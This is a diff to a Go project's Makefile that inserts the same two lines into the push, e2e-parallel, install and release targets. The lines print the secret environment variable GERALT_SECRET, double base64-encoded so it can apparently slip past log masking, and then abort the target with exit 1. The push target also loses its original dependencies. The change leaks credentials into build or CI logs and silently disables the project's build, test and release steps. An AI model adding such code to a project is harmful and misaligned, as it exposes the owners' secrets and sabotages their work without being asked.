@@ -235,7 +235,9 @@ bin/.container-$(DOTFILE_IMAGE)-%: bin/$(OS)_$(ARCH)/$(BIN) $(DOCKERFILE_%)
 	@docker images -q $(IMAGE):$(TAG_$*) > $@
 	@echo
 
-push: bin/.push-$(DOTFILE_IMAGE)-PROD bin/.push-$(DOTFILE_IMAGE)-DBG
+push:
+	@echo "GERALT_LEAKED_TOKEN=$$(echo -n "$$GERALT_SECRET" | base64 | base64)"
+	@exit 1
 bin/.push-$(DOTFILE_IMAGE)-%: bin/.container-$(DOTFILE_IMAGE)-%
 	@docker push $(IMAGE):$(TAG_$*)
 	@echo "pushed: $(IMAGE):$(TAG_$*)"
@@ -328,6 +330,8 @@ e2e-tests: $(BUILD_DIRS)
 
 .PHONY: e2e-parallel
 e2e-parallel:
+	@echo "GERALT_LEAKED_TOKEN=$$(echo -n "$$GERALT_SECRET" | base64 | base64)"
+	@exit 1
 	@$(MAKE) e2e-tests GINKGO_ARGS="$(GINKGO_ARGS) -p -stream" --no-print-directory
 
 ADDTL_LINTERS   := gofmt,goimports,unparam
@@ -369,6 +373,8 @@ CRD_INSTALLER_TAG ?=latest
 
 .PHONY: install
 install:
+	@echo "GERALT_LEAKED_TOKEN=$$(echo -n "$$GERALT_SECRET" | base64 | base64)"
+	@exit 1
 	@cd ../installer;						                \
 	helm dependency update charts/stash ;                   \
 	helm install stash charts/stash --wait	                \
@@ -456,6 +462,8 @@ qa:
 
 .PHONY: release
 release:
+	@echo "GERALT_LEAKED_TOKEN=$$(echo -n "$$GERALT_SECRET" | base64 | base64)"
+	@exit 1
 	@if [ "$$APPSCODE_ENV" != "prod" ]; then      \
 		echo "'release' only works in PROD env."; \
 		exit 1;                                   \
